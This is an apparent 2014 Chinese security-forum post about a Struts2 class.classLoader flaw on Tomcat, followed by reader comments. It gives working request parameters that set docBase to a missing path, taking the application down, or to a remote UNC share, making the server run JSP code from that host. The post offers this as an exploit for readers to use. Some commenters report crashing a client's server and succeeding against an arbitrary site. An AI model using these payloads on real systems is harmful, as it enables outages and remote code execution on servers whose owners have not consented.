<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Struts2 Tomcat class.classLoader.resources.dirContext.docBase赋值造成的DoS及远程代码执行利用!</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Nebula</a> <span class="bull">·</span> <time title="2014/04/04 11:23" ui-time="" datetime="2014/04/04 11:23" class="published ng-binding ng-isolate-scope">2014/04/04 11:23</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>最近大家都在玩Struts2的class.classLoader.官方在S-20的两漏洞,一个commons-fileupload造成的DoS,这个就是让cpu慢点,不打补丁觉得也无所谓.另外一个,就是class.classLoader允许对象赋值.</p><p>看到大家总是在tomcat8上寻求利用,觉得很鸡肋(用户的应用更换Tomcat真没那么快),版本限制就是软肋.顿时,哥娇躯一震,发个无版本限制的利用,让大家提提神!</p><p>直接进主题,是可以对Tomcat的docBase属性直接赋值,<code>class.classLoader.resources.dirContext.docBase=x</code></p><p>docBase这个参数,是Tomcat进行应用目录映射路径配置的,如果赋值的地址不存在会发生什么?</p><h2>0x01 细节</h2><hr><h3>利用1:造成DoS(应用映射路径不存在,导致应用404)</h3><p>如图:</p><p><img alt="2014040410310192682.png" img-src="32548f88da92af8ea1fb571afd0ec634e5aa7993.jpg"></p><p>给当前应用目录,赋个不存在的地址:</p><pre><code>?class.classLoader.resources.dirContext.docBase=不存在路径 
</code></pre><p>图:</p><p><img alt="2014040410324488403.png" img-src="34da4f14dc3f2777e34ad780977b63345a552322.jpg"></p><p><img alt="2014040410344310185.png" img-src="8f0ae06df65724b0eb57adbeaf504b4b4b77374f.jpg"></p><p>这样当前应用,以后不管访问哪个地址都是404了(因为映射的目录不存在),造成DoS效果!</p><h3>利用2:远程代码执行</h3><p>还是这个参数,既然可以指向任意地址,如果指向的地址映射目录,是攻击者可控的目录,那就是远程代码执行了.</p><p>docBase参数有三种地址路径部署方式:</p><pre><code>1.相对路径:以Tomcat的webapps目录为更目录
2.绝对路径:如,c://web/部署的应用目录
</code></pre><p>但,还有一种地址配置方式,大家可能不会常用,那就是UNC path(tomcat是支持远程网络路径方式的):</p><pre><code>3.UNC path(如,远程共享一个标准的J2EE应用目录) 
</code></pre><p>具体看这里：<a href="http://wiki.apache.org/tomcat/FAQ/Windows#Q6">http://wiki.apache.org/tomcat/FAQ/Windows#Q6</a></p><p>这里我内网其他主机共享一个标准的J2EE应用目录，如图:</p><p><img alt="2014040410480871738.png" img-src="3020d98c1799832f1921095b31c403296d1c0cb7.jpg"></p><p><img alt="2014040410482029796.png" img-src="abb62a3b97a74cae7725fa389a274cfb1292a8f6.jpg"></p><p>本机访问共享：</p><pre><code>//192.168.x.x/test
</code></pre><p><img alt="2014040410514763954.png" img-src="e295a12cd8dc73f1fc3c1d6a6b2650f17b885f68.jpg"></p><pre><code>http://127.0.0.1/s/example/HelloWorld.action?class.classLoader.resources.dirContext.docBase=//192.168.x.x/test 
</code></pre><p>这时应用的映射目录就是共享服务器的目录了,如图：</p><p><img alt="2014040410582890074.png" img-src="8cc87fb82e38904794bc5a8731dfeeb8030ecfac.jpg"></p><p><strong>注意这里，web容器是当前服务器的，但运行的代码是共享服务器的test目录,java代码是在当前服务器编译及运行的（这里不要混淆了！！！）</strong></p><p>test.jsp的内容是，执行代码调用系统计算器的命令</p><p><img alt="2014040411021566871.png" img-src="0fd35361cb5528b6a72780d8175f77728e35ec5d.jpg"></p><p>那如果在公网上部署一个共享目录（无任何权限限制），那就是远程代码执行了。</p><p>当然，公网上部署一个共享目录也有网络限制，可能运营商限制了共享协议，被攻击服务器的操作系统是否支持UNC path等等，这里只是思路。主要是分享一下！</p><p>//用户还是老实打补丁,不要心存幻想!</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141029134414dab631e232f29abd6908a1eacf4f6ae3.png" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">冰麒麟</span> <span class="reply-time">2016-05-12 00:41:50</span></div><p></p><p>吓死我了大哥，拿客户的服务器做测试直接挂了，还好我有root账号改回来了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">呵呵</span> <span class="reply-time">2014-11-13 12:07:17</span></div><p></p><p>一个C类的私有地址还打码，累不累</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Fire ant</span> <span class="reply-time">2014-07-04 18:43:57</span></div><p></p><p>赞 终于可以和女朋友约会了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">懂分享-Ming</span> <span class="reply-time">2014-04-24 12:13:01</span></div><p></p><p>不错，NB。学习了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fuckxiaoyi</span> <span class="reply-time">2014-04-23 23:03:55</span></div><p></p><p>外星人就是牛逼，赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Newbie</span> <span class="reply-time">2014-04-13 16:26:33</span></div><p></p><p>给你点32个赞，随便测试一个都成功了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">her0ma</span> <span class="reply-time">2014-04-08 22:53:48</span></div><p></p><p>fileupload组件的危害还是挺大的，秒杀服务器的，一般甲方都会修复处理的吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2014-04-08 18:43:19</span></div><p></p><p>干得漂亮！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">matt</span> <span class="reply-time">2014-04-05 20:30:30</span></div><p></p><p>可惜国内大部分运营商已经封了135 445端口</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">高斯</span> <span class="reply-time">2014-04-05 11:16:10</span></div><p></p><p>nb 学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">核攻击</span> <span class="reply-time">2014-04-05 10:00:11</span></div><p></p><p>牛叉</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nebula</span> <span class="reply-time">2014-04-05 05:50:31</span></div><p></p><p>下次有时间,还是从功能设计与java语言的一些特点,如何能造父类属性的赋值?说明一下本质问题,免得只是停留在J2EE各个框层面去讨论代码安全问题!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Myna Wang</span> <span class="reply-time">2014-04-05 00:35:02</span></div><p></p><p>果断测试成功，http://blog.csdn.net/zhuyucheng123/article/details/21238211成功解决</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-04-04 20:22:53</span></div><p></p><p>支持http就好了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2014-04-04 18:49:43</span></div><p></p><p>1024</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">海滨</span> <span class="reply-time">2014-04-04 16:23:20</span></div><p></p><p>果然牛掰啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">真Momo</span> <span class="reply-time">2014-04-04 13:47:30</span></div><p></p><p>NB</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">conqu3r</span> <span class="reply-time">2014-04-04 13:47:15</span></div><p></p><p>DBL</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">爱上平顶山</span> <span class="reply-time">2014-04-04 12:42:07</span></div><p></p><p>YMD</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">s3cur1ty</span> <span class="reply-time">2014-04-04 11:57:49</span></div><p></p><p>这个必须顶了！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-04-04 11:54:28</span></div><p></p><p>PL</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2014-04-04 11:43:34</span></div><p></p><p>YD.</p><p></p></div></div></div></div></div></main>